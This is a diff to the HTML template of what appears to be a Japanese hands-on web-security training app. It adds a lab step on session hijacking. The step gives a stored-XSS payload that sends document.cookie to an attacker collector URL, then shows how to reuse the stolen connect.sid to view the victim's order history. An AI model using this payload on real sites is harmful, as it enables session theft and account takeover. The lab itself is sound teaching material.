@@ -86,6 +86,17 @@
 
   <div class="card stack">
     <div class="section-title">
+      <span class="pill">Session</span>
+      <h3 style="margin: 0;">体験⑤ セッションハイジャック</h3>
+    </div>
+    <ol>
+      <li><a href="/login">ログイン</a>（alice / password123）して<a href="/products/1">商品詳細</a>を開く</li>
+      <li>コメント欄に <code>&lt;script&gt;fetch('<%= attackerCollectorUrl %>?cookie=' + encodeURIComponent(document.cookie))&lt;/script&gt;</code> を投稿する</li>
+      <li>商品詳細を再表示し、保存型XSSで Cookie が Attacker 側へ送られることを発生させる</li>
+      <li>新しいタブで<a href="<%= attackerSessionHijackUrl %>" target="_blank" rel="noreferrer">Session Hijack ページ</a>を開き、盗まれた <code>connect.sid</code> を確認する</li>
+      <li>「盗んだセッションで注文履歴を見る」を押し、被害者として注文履歴へアクセスできることを確認する</li>
+    </ol>
+    <p class="muted">原因: XSS と JavaScript から読めるセッションCookieが組み合わさり、攻撃者が被害者のログイン状態を再利用できる</p>
       <span class="pill">Traversal</span>
       <h3 style="margin: 0;">体験⑤ ディレクトリ・トラバーサル</h3>
     </div>
